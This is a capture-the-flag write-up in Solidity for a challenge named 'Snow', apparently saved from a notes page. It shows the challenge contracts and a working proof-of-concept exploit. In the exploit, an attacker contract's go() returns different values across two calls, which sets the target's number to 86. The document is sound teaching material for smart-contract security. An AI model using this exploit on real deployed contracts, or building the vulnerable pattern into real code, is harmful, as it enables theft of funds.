# Snow

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import {Snow} from "./Snow.sol";

contract Setup {
    Snow public snow;
    bool public solved;
    address internal deployer;

    constructor() payable {
        snow = new Snow();
        deployer = msg.sender;
    }

    function isSolved() external returns (bool) {
        if (snow.number() == 86) {
            solved = true;
        }
        return solved;
    }

    function getSnow() external view returns (address) {
        return address(snow);
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//三元运算符

interface Snowman {
    function go() external view returns (uint256);
}

contract Snow {
    bool public cold;
    uint256 public number = 923;
    Snowman public snowman;

    function setSnowman(address _snowman) external {
        snowman = Snowman(_snowman);
    }

    function snow() public {
        if (snowman.go() >= number && !cold) {
            cold = true;
            number = snowman.go();
        } else {
            cold = false;
        }
    }
}

```

# poc
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Setup} from "./setup.sol";
import {Snow} from "./Snow.sol";

contract Attack {
    Snow public snow;
    bool public xuan;

    constructor(address _snow) {
        snow = Snow(_snow);
    }

    function go() external view returns (uint256) {
        return snow.cold() ? 86 : 999;
    }

    function attack() external {
        snow.setSnowman(address(this));
        snow.snow();
    }
}


```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/1.sol";
import {Setup} from "../src/setup.sol";
import {Script} from "../lib/forge-std/src/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();

        Setup setup = Setup(address(1));
        address snowAddr = setup.getSnow();
        Attack attack = new Attack(snowAddr);

        attack.attack();

        vm.stopBroadcast();
    }
}

```



> 更新: 2025-12-17 21:08:47  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/gmgdl2opl8mn99gc>